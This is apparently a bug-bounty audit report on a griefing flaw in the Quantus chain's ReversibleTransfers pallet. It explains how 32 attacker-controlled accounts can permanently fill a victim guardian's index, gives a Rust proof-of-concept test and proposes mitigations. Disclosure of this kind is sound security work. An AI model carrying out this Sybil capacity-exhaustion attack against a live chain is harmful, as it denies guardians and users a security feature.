# 89284 bc medium permissionless high security enrollment lets attackers irreversibly exhaust an arbitrary guardian s account capacity

**Submitted on Aug 18th 2026 at 12:03:52 UTC by @CarlosMB for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89284
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

`ReversibleTransfers::set_high_security()` allows any signed account to unilaterally choose any other `AccountId` as its guardian:

```rust
pub fn set_high_security(
    origin: OriginFor<T>,
    delay: BlockNumberOrTimestampOf<T>,
    guardian: T::AccountId,
) -> DispatchResult {
    let who = ensure_signed(origin)?;

    ensure!(guardian != who.clone(), Error::<T>::GuardianCannotBeSelf);
```

There is no guardian-side signature, acceptance, registration, or consent.

However, the pallet maintains a bounded reverse index for each guardian:

```rust
pub type GuardianIndex<T: Config> = StorageMap<
    _,
    Blake2_128Concat,
    T::AccountId,
    BoundedVec<T::AccountId, T::MaxGuardianAccounts>,
    ValueQuery,
>;
```

and production config sets:

```rust
pub const MaxGuardianAccounts: u32 = 32;
```

`set_high_security()` uses this reverse index as an admission condition:

```rust
GuardianIndex::<T>::try_mutate(guardian.clone(), |accounts| {
    if !accounts.contains(&who) {
        accounts
            .try_push(who.clone())
            .map_err(|_| Error::<T>::TooManyGuardianAccounts)
    } else {
        Ok(())
    }
})?;

HighSecurityAccounts::<T>::insert(
    who.clone(),
    &high_security_account_data
);
```

Therefore a third party can consume another account's bounded guardian capacity without authorization.

An attacker creates 32 ordinary accounts `A1..A32` and from each calls:

```
set_high_security(delay, G)
```

where `G` is the victim guardian.

After those calls:

```
GuardianIndex[G].len() == 32
```

Any subsequent legitimate user attempting:

```
set_high_security(delay, G)
```

fails with:

```
TooManyGuardianAccounts
```

The victim guardian has no callable operation that removes the attacker-controlled accounts from its index.

## Root Cause

The root cause is that an **unauthenticated third party controls consumption of a bounded resource owned by another identity**.

`GuardianIndex` is documented as a reverse lookup:

```rust
/// Maps guardian accounts to the list of accounts they protect.
/// This allows the UI to efficiently query all accounts for which a given account is a
/// guardian.
```

but the bounded representation is also used as security-sensitive admission control.

The account being inserted chooses the guardian unilaterally, while the guardian:

* does not sign;
* does not accept;
* does not register the protected account;
* cannot reject the relationship;
* cannot remove the relationship later.

This allows arbitrary users to consume all capacity associated with any chosen guardian.

## External Reachability

The attack is fully permissionless.

The only origin check in `set_high_security()` is:

```rust
let who = ensure_signed(origin)?;
```

The attacker does **not** need:

* the guardian's private key;
* guardian approval;
* governance;
* Root;
* Technical Collective privileges;
* an existing relationship with the guardian.

The attacker only needs `MaxGuardianAccounts` ordinary signed accounts and enough balance to submit the transactions.

There is no guardian-registration deposit or guardian-side authorization tied to the slot being consumed.

## Attack Path

Assume `G` is a guardian address that legitimate users intend to use.

In production:

```
MaxGuardianAccounts = 32
```

The attacker controls 32 Sybil accounts:

```
A1, A2, ..., A32
```

Each attacker account executes:

```
A1  -> set_high_security(delay, G)
A2  -> set_high_security(delay, G)
...
A32 -> set_high_security(delay, G)
```

Every call succeeds because:

```
guardian != attacker
attacker is not already high-security
delay is valid
GuardianIndex[G] still has capacity
```

The resulting state is:

```
GuardianIndex[G] = [A1, A2, ..., A32]
len = MaxGuardianAccounts
```

Now Alice attempts to enable high-security mode with the same guardian:

```
Alice -> set_high_security(delay, G)
```

The call reaches:

```rust
accounts.try_push(Alice)
```

and fails with:

```rust
Error::<T>::TooManyGuardianAccounts
```

Because the `GuardianIndex` mutation fails before:

```rust
HighSecurityAccounts::<T>::insert(...)
```

Alice does not enter high-security mode at all.

The attacker has therefore denied `G` to all future users.

## Why the DoS persists

There is no normal lifecycle operation that removes protected accounts from `GuardianIndex`.

The important cleanup/recovery path is `recover_funds()`.

It:

{% stepper %}
{% step %}

## Verifies the caller is the configured guardian

{% endstep %}

{% step %}

## Cancels/reconciles pending transfers

{% endstep %}

{% step %}

## Sweeps the protected account's free balance to the guardian

{% endstep %}
{% endstepper %}

But it never removes:

```
HighSecurityAccounts[account]
```

or:

```
account from GuardianIndex[guardian]
```

So even if the victim guardian uses its strongest available recovery operation against one of the attacker's accounts and completely drains it, the slot remains occupied.

Account balance reaping does not clean pallet-specific storage either.

Therefore the attacker can sacrifice minimally funded Sybil accounts and leave the victim guardian's bounded capacity exhausted indefinitely under normal protocol operation.

A privileged runtime/storage migration could repair the state, but there is no recovery path available to the victim guardian or legitimate users.

## Existing protocol test already proves the saturation primitive

The repository already contains:

```rust
#[test]
fn guardian_index_respects_max_limit() {
    new_test_ext().execute_with(|| {
        let guardian = account_id(100);
        let delay = BlockNumberOrTimestamp::BlockNumber(10);

        // Add accounts up to the limit (MaxGuardianAccounts = 10 in mock)
        for i in 101..=110 {
            assert_ok!(ReversibleTransfers::set_high_security(
                RuntimeOrigin::signed(account_id(i)),
                delay,
                guardian.clone(),
            ));
        }

        let guardian_accounts =
            ReversibleTransfers::guardian_index(&guardian);

        assert_eq!(guardian_accounts.len(), 10);

        assert_err!(
            ReversibleTransfers::set_high_security(
                RuntimeOrigin::signed(account_id(111)),
                delay,
                guardian.clone(),
            ),
            Error::<Test>::TooManyGuardianAccounts
        );
    });
}
```

This already establishes that arbitrary signed accounts can fill the bounded guardian index and that the next user is rejected.

The PoC below extends that existing regression test to demonstrate the security impact: the accounts filling the vector are attacker-controlled, the rejected account is an unrelated legitimate user, and even `recover_funds()` does not release a consumed slot.

## Severity / Impact

**Medium — BC-M08: Griefing**

An unprivileged attacker can use ordinary signed accounts to permanently consume all `MaxGuardianAccounts` slots of an arbitrary guardian address.

Once the guardian's bounded reverse index is full, every later legitimate user attempting to select that guardian is deterministically rejected with `TooManyGuardianAccounts`.

The targeted guardian cannot reject the malicious relationships, remove them, or reclaim the consumed slots through any normal protocol operation. Even `recover_funds()` empties the malicious protected account without removing its `HighSecurityAccounts` entry or its slot from `GuardianIndex`.

In production `MaxGuardianAccounts = 32`, so 32 attacker-controlled accounts are sufficient to deny that guardian to every future user.

## Proof of Concept

## File

Add the following test to:

```
pallets/reversible-transfers/src/tests/test_reversible_transfers.rs
```

The existing mock config uses:

```rust
pub const MaxGuardianAccounts: u32 = 10;
```

while production uses:

```rust
pub const MaxGuardianAccounts: u32 = 32;
```

The vulnerability is generic over `T::MaxGuardianAccounts`; the smaller mock value only makes the regression test shorter.

## PoC code

```rust
#[test]
fn attacker_can_irreversibly_exhaust_arbitrary_guardian_capacity() {
    new_test_ext().execute_with(|| {
        let victim_guardian = account_id(100);
        let delay = BlockNumberOrTimestamp::BlockNumber(10);

        // The mock runtime sets MaxGuardianAccounts = 10.
        // Treat accounts 101..=110 as attacker-controlled Sybil accounts.
        for i in 101..=110 {
            assert_ok!(ReversibleTransfers::set_high_security(
                RuntimeOrigin::signed(account_id(i)),
                delay,
                victim_guardian.clone(),
            ));
        }

        // 1. Attacker has completely consumed the victim guardian's capacity.
        let guardian_accounts =
            ReversibleTransfers::guardian_index(&victim_guardian);

        assert_eq!(
            guardian_accounts.len(),
            MaxGuardianAccounts::get() as usize
        );

        // 2. An unrelated legitimate user can no longer select this guardian.
        let legitimate_user = account_id(111);

        assert_err!(
            ReversibleTransfers::set_high_security(
                RuntimeOrigin::signed(legitimate_user.clone()),
                delay,
                victim_guardian.clone(),
            ),
            Error::<Test>::TooManyGuardianAccounts
        );

        // The failed enrollment did not put the legitimate user into HS mode.
        assert!(
            ReversibleTransfers::high_security_accounts(&legitimate_user).is_none()
        );

        // 3. The guardian attempts the strongest normal cleanup available against
        // one malicious protected account.
        let malicious_account = account_id(101);

        assert!(
            Balances::free_balance(&malicious_account) > 0,
            "test setup: malicious account must initially have funds"
        );

        assert_ok!(ReversibleTransfers::recover_funds(
            RuntimeOrigin::signed(victim_guardian.clone()),
            malicious_account.clone(),
        ));

        // recover_funds successfully drains the malicious account...
        assert_eq!(
            Balances::free_balance(&malicious_account),
            0,
            "recover_funds should have drained the malicious account"
        );

        // ...but the attacker-controlled relationship remains permanently stored.
        assert!(
            ReversibleTransfers::high_security_accounts(&malicious_account).is_some(),
            "recover_funds does not remove HighSecurityAccounts"
        );

        let guardian_accounts_after_recovery =
            ReversibleTransfers::guardian_index(&victim_guardian);

        assert_eq!(
            guardian_accounts_after_recovery.len(),
            MaxGuardianAccounts::get() as usize,
            "recover_funds did not release any guardian capacity"
        );

        assert!(
            guardian_accounts_after_recovery.contains(&malicious_account),
            "the drained malicious account still permanently occupies a guardian slot"
        );

        // 4. The legitimate user is STILL unable to use the victim guardian after
        // recovery/draining of one attacker account.
        assert_err!(
            ReversibleTransfers::set_high_security(
                RuntimeOrigin::signed(legitimate_user.clone()),
                delay,
                victim_guardian.clone(),
            ),
            Error::<Test>::TooManyGuardianAccounts
        );

        assert!(
            ReversibleTransfers::high_security_accounts(&legitimate_user).is_none()
        );
    });
}
```

## Run

From the chain repository root:

```bash
cargo test -p pallet-reversible-transfers \
  attacker_can_irreversibly_exhaust_arbitrary_guardian_capacity \
  -- --nocapture
```

## Expected result

The test should pass.

The important state transition is:

```
Before attack:

GuardianIndex[G].len() = 0


After attacker enrollments:

GuardianIndex[G].len() = MaxGuardianAccounts

A1 .. AMax are attacker-controlled


Legitimate enrollment:

Alice -> set_high_security(delay, G)

Result:
TooManyGuardianAccounts

HighSecurityAccounts[Alice] = None


Guardian tries to clean one attacker account:

G -> recover_funds(A1)

Balances[A1] = 0

but:

HighSecurityAccounts[A1] = Some(...)
GuardianIndex[G] still contains A1
GuardianIndex[G].len() = MaxGuardianAccounts


Alice retries:

Alice -> set_high_security(delay, G)

Result:
TooManyGuardianAccounts
```

This demonstrates both the permissionless capacity exhaustion and the lack of a normal recovery path.

## Impact

A malicious user can intentionally deny an arbitrary guardian address to all future high-security users.

This is particularly relevant for guardians that are intended to be reused, such as:

* organizational recovery accounts;
* custodial/recovery services;
* publicly recommended guardians;
* corporate security addresses;
* any guardian address shared among multiple users.

The attack does not need to compromise `G`.

The victim guardian also cannot fix the problem by recovering or draining the malicious protected accounts: those accounts remain permanently present in `GuardianIndex`.

The protocol therefore lets unrelated users irreversibly consume a bounded resource belonging to another security identity.

This is a targeted denial of service / griefing attack and maps to:

**BC-M08 — Griefing**

The report does not claim loss or freezing of user funds.

## Why this is not merely the intentional permanence of High Security

The protocol intentionally documents that a user who enables high-security mode cannot later disable it.

That is not the issue reported here.

This report does not require changing the permanence of the protected account's own security configuration.

The vulnerability is that the permanent relationship consumes **bounded capacity associated with a different account**:

```
protected account A
        |
        | chooses unilaterally
        v
guardian G
        |
        | loses one of only MaxGuardianAccounts slots
        v
permanent capacity consumption
```

`G` neither requests nor authorizes that capacity consumption.

With enough attacker-controlled accounts, third parties can therefore weaponize the intended permanence against an unrelated guardian and deny it to future legitimate users.

## Why choosing another guardian does not remove the impact

A legitimate user may technically select a different address, but this does not undo the targeted denial of service against `G`.

The security primitive explicitly allows reusable guardian accounts and maintains a reverse index of accounts protected by each guardian.

If `G` is a specific recovery service, organizational account, custodian, or pre-established security identity, an attacker can make that advertised guardian unusable for all new enrollments.

Requiring every targeted guardian to rotate to a fresh address after an attacker fills its slots is itself the attacker-imposed disruption.

More importantly, the victim has no protocol operation that restores the consumed resource.

## Recommended Mitigation

Do not allow one party to irreversibly consume another account's bounded guardian capacity without authorization.

Possible fixes include:

### Option 1 — Guardian acceptance

Use a two-step enrollment:

```
user requests G as guardian
        ↓
G accepts
        ↓
slot is consumed
        ↓
high security becomes active
```

Only accepted relationships count toward `MaxGuardianAccounts`.

### Option 2 — Remove the guardian-wide admission bound

If `GuardianIndex` exists only as a reverse lookup, do not make its `BoundedVec` capacity determine whether a user may enter high-security mode.

For example, use a keyed mapping:

```
(guardian, protected_account) -> true
```

and paginate/index it off-chain as needed.

### Option 3 — Guardian-controlled removal/rejection

If a bounded index is required, give the guardian a safe way to reject unsolicited relationships and release the slot without weakening the protected account's own high-security guarantees.

The key invariant should be:

> An unrelated account must not be able to permanently consume a bounded resource associated with another account without that account's authorization.
